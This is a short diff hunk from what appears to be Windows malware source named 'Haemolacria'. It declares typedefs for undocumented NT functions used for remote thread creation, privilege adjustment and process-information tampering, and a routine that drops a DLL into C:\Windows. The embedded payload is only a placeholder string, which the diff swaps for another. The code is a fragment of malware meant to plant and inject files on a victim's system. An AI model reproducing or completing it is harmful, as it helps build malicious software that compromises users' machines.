@@ -6,7 +6,7 @@ typedef NTSTATUS(NTAPI* RtlCreateUserThreadDef) (IN HANDLE hProcess, IN LPVOID l
 typedef NTSTATUS(*RtlAdjustPrivilegeDef) (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 typedef NTSTATUS(NTAPI* NtSetInformationProcessDef) (HANDLE, DWORD, PVOID, DWORD);
 VOID WriteHaemolacria() {
-	const static BYTE Haemolacria[] = "you know wht you need to do!;
+	const static BYTE Haemolacria[] = "compile it yourself";
 	DWORD dwAttribs = GetFileAttributesW(L"C:\\Windows\\Haemolacria.dll");
 	HANDLE hFile = CreateFileW(L"C:\\Windows\\Haemolacria.dll", FILE_WRITE_ACCESS, NULL, NULL, CREATE_NEW, 0, NULL);
 	WriteFile(hFile, Haemolacria, sizeof(Haemolacria), &dwAttribs, NULL);
